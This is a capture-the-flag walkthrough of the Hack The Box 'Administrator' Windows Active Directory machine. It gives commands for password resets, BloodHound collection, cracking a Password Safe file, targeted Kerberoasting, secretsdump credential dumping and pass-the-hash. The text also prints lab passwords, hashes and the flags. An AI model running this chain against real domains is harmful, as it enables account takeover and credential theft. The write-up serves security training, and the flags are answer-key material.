# ENUMERATION
---

## OPEN PORTS
---

| PORT     | SERVICE       |
| :------- | :------------ |
| 21/tcp   | ftp           |
| 53/tcp   | domain        |
| 88/tcp   | kerberos-sec  |
| 135/tcp  | msrpc         |
| 139/tcp  | netbios-ssn   |
| 389/tcp  | ldap          |
| 445/tcp  | microsoft-ds? |
| 464/tcp  | kpasswd5?     |
| 593/tcp  | ncacn_http    |
| 636/tcp  | tcpwrapped    |
| 3268/tcp | ldap          |
| 3269/tcp | tcpwrapped    |

We have a windows machine, HTB give us the following credentials for initial access:

```ad-note
`Olivia`:`ichliebedich`
```

Let's begin reconnaissance.

# RECONNAISSANCE
---

Since we got some credentials, let's use `evil-winrm` to log:


![Pasted image 20250116163132.png](../../IMAGES/Pasted%20image%2020250116163132.png)

We can use `net users` to list all the users in this machine:

![Pasted image 20250116163210.png](../../IMAGES/Pasted%20image%2020250116163210.png)

We can attempt to change password for these users, with `net user {user} {password_to_set}`, after trying I found I could change the password for user Michael:


![Pasted image 20250116163543.png](../../IMAGES/Pasted%20image%2020250116163543.png)

So, we can log using `evil-winrm` with the set credentials:


![Pasted image 20250116163724.png](../../IMAGES/Pasted%20image%2020250116163724.png)

Nice, we could log as `michael`, an useful step would be dumping the AD json using `bloodhound-python` to perform analysis:

```ad-hint
#### Used
---

`bloodhound-python -v -u Olivia -p ichliebedich -ns 10.10.11.42 -d administrator.htb -c All`

In order to perform this command we need to add `administrator.htb` to `/etc/hosts`, we can use:

`echo '10.10.11.42 administrator.htb' | sudo tee -a /etc/hosts`


#### Output
----


Now we can analyze the data, let's take a look and highlight the most important stuff.
```


# EXPLOITATION
---

After analyzing the data, we check we can use `michael` account to change the password of `benjamin`, this can be performed using `net rpc` in the following way:


```ad-hint
`net rpc password "benjamin" "benjaminPasword" -U "administrator.htb"/"michael"%"password" -S "administrator.htb"`
```


We can check it worked using `smbclient`:

![Pasted image 20250116165415.png](../../IMAGES/Pasted%20image%2020250116165415.png)

Nice, let's list all available shares using `smbmap`:

`smbmap -H 10.10.11.42 -u 'benjamin' -p 'benjaminPasword`

![Pasted image 20250116165547.png](../../IMAGES/Pasted%20image%2020250116165547.png)


We have FTP enabled, let's use it to read files:

![Pasted image 20250116165908.png](../../IMAGES/Pasted%20image%2020250116165908.png)

We got a `Backup.psafe3` file, let's download it on our local machine:


![Pasted image 20250116170832.png](../../IMAGES/Pasted%20image%2020250116170832.png)

We need to do the following in order to be able to read the file:

```ad-summary
1. `pwsafe2john Backup.psafe3 > pwsafe.hash`
2. `john --wordlist=/usr/share/wordlists/rockyou.txt pwsafe.hash`

#### Output
----


We got it: `tekieromucho`
```


Let's view that data, we can use `pwsafe`:

![Pasted image 20250116171455.png](../../IMAGES/Pasted%20image%2020250116171455.png)

We got some data about three people: `alexander`, `emily`, `emma`, let's log using the password found for `emily`:


```ad-note
`emily`:`UXLCI5iETUsIBoFVTj8yQFKoHjXmb`
```


![Pasted image 20250116172606.png](../../IMAGES/Pasted%20image%2020250116172606.png)

Let's get our user flag and begin privilege escalation:

![Pasted image 20250116173148.png](../../IMAGES/Pasted%20image%2020250116173148.png)

```ad-important
User: `8870f70828e61d9ab29b0db1e5c1be2f`

```


# PRIVILEGE ESCALATION
---

`emily` has `GenerticWrite` privilege over user `ethan`, we need to follow these steps to get the Ethan `TGT` and be able to crack the password:


```ad-summary
1. `sudo ntpdate administrator.htb`
2. `targetedKerberoast.py -v -d 'administrator.htb' -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb`
```

```
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$75b235c6e6c67bdfe14a9bde086dd035$cf17dd68284aa57d783da4606072c3869b95058cc3180105fae564828aa489adc853e086bf7fc4ce0934bdf46e267dad7f15428843733c8599ed0f01c69168f127ffd3e55529e161e8b0202167588caa136328eb20e29c1694ad9de38a572a93c33fa566a85e849e373f6a96247ee9103848932e07dca83a22a36d7b34d43f25c5d11b5f5f69f2804e6e65c270fa54972dbb2cb4c36c77689f9fc074def5dd851986a83a3ec3c29b1094871e006e7b4d1e99b4ef5390f6ca7bf62d44905ae1478a8219a823ddf7f0195efacb84c5a4a05bfa98c0768af837ebd7815a1ffd69e0ce53c8bfb8e6160ec689bc862b0ca8ad0aa91663cbf7d1ece3822224a39e0632450f406e637b93720fce9b62e8ccf5f4a2d255e3952eee5348f274ea393dc9ee65f2ceee9afd7f55f7b3dea3e3d7469f186fefd57fffd30b0db2468c6008ad31c3cc3169a7bcc058836fc3f23f4097a0e145876ca3ce33c700e2501ca9e67ecc99f2be45d3b26e25f4d84f2d4b42d84b8d52e24bc411d737652a68ccb3c57455dfb55bb37b07a9e0141b89eeabc7cea9bce944522414f7f6ba1f2e0778f7c3fe393a62475a30b954000e51ebe1cee44656ba5c510cfb38f97e37eb91023e0eec65eaa11f12f4cb75ba34476f7b3d89cffd334e4707ed20172386440c7dd5ea218453041850873bb180e617f3438863242cb721ebbca278925fd9c3fe01813025f90974f492e23525d04813279ff4b2d11f95027e26659b4717d52296f11b86a723fc6c4889db20c8894490457c90d28e8d008d924982a5cd845cd32e9207c3365d52e4d359616205f827fd275f574cf4320d4318e4104026eeae7c9f991ff13ff2f5b16cdd0febd9a5b4524894c24683ff6ae46a85d7b81486aad0fccbb63ec80ed6389e147c9cc80f1603d114e546351dd417659382e020eeba717405ffcf49cf63098a6e47bc2f4213a9ac403ac993a62444dfa80d66c7d73a78b98ee083a65e81d176e7caf8e41b5e205b2fbfaab6161e1c2b1f467fe2b05ed6681d4f66ebbea23d554a97e2040f3be53d3031f69774d8d34a95e901a6effdd38124d03e7a111f691068fc09fd8362c076fc377bf60a211a3ec0cfa1a0a7ba5b1e7cb7e20b7a31c0700528478cdf0dda75617f55bd35c32ad84c87952bcac33a85ed8b57759908a8eb5fd38810d42b8c0fd7d42d440c6e3d50e1907a2a98a4fca50162ef3fefbe52e17c973b71a617b89147ad33fff4a2bfa0dc351c4b6068cc9af88010ebfb31e6c55656830c204f4ecfd901f9fdd9cd1539ec58b9bc44744abd0bbf013a6d8236c2ea775c3282cd1bf37bd4c05b2a1b606fe6956a171475385e03cc13aa8630190c2662b68440c0e68c0931ad7800f1821016bd1335999f9818c9e01b30f3f13004f2aab0afb6d97d623a6294c5b89adb7130d085f11c54e1f6149503f153970f4e8f3e8f1a6913c450e848c0059dbada2bb7f3e1b80278c306d7ebba10b8e95b8dcd52b561acb4219acde07078c7b8ce46723b0595414b03f42c189d
```

In that way, we can obtain the TGT, we can crack it using john:

```ad-hint
`john --wordlist=/usr/share/wordlists/rockyou.txt ethan.hash`
```

![Pasted image 20250116181304.png](../../IMAGES/Pasted%20image%2020250116181304.png)

We got Ethan password: `limpbizkit`, we can do the following in order to get the admin hash:

```ad-hint
`impacket-secretsdump administrator.htb/ethan:limpbizkit@10.10.11.42`


##### Output
---

```

So, our admin hash would be: 

```ad-note
Hash: `3dc553ce4b9fd20bd016e098d2d2fd2e`
```

Let's log in:

![Pasted image 20250116181640.png](../../IMAGES/Pasted%20image%2020250116181640.png)

```ad-important
Root: `28aaa826bd73c76cf8c151cca7108e23`
```

